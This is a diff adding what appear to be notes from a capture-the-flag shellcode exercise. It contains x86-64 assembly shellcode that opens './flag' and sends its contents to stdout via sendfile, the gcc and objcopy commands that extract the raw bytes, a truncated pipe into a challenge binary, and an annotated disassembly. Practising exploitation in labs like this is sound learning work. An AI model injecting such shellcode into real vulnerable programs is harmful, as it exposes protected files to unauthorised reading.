@@ -1,0 +1,47 @@
+.global _start
+_start:
+.intel_syntax noprefix
+        xor rax, rax
+        mov al, 2
+        lea rdi, [rip+flag]
+        xor rsi, rsi
+        xor rdx, rdx
+        syscall
+        mov rsi, rax
+        mov al, 40
+        xor rdi, rdi
+        inc rdi
+        mov r10, 0x3e8
+        syscall
+        mov al, 60
+        xor rdi, rdi
+        syscall
+flag:
+        .string "./flag"
+
+gcc -nostdlib -static /tmp/test.s -o /tmp/test
+objcopy --dump-section .text=/tmp/test.md /tmp/test
+cat /tmp/test.md | ./
+
+0000000000401000 <_start>:
+  401000:       48 31 c0                xor    rax,rax					# 48 64位操作数大小 31 xor指令 c0 rax是0, c是
+  401003:       b0 02                   mov    al,0x2
+  401005:       48 8d 3d 23 00 00 00    lea    rdi,[rip+0x23]        # 40102f <flag>
+  40100c:       48 31 f6                xor    rsi,rsi
+  40100f:       48 31 d2                xor    rdx,rdx
+  401012:       0f 05                   syscall
+  401014:       48 89 c6                mov    rsi,rax
+  401017:       b0 28                   mov    al,0x28
+  401019:       48 31 ff                xor    rdi,rdi
+  40101c:       48 ff c7                inc    rdi
+  40101f:       49 c7 c2 e8 03 00 00    mov    r10,0x3e8
+  401026:       0f 05                   syscall
+  401028:       b0 3c                   mov    al,0x3c
+  40102a:       48 31 ff                xor    rdi,rdi
+  40102d:       0f 05                   syscall
+
+000000000040102f <flag>:
+  40102f:       2e 2f                   cs (bad)
+  401031:       66 6c                   data16 ins BYTE PTR es:[rdi],dx
+  401033:       61                      (bad)
+  401034:       67                      addr32
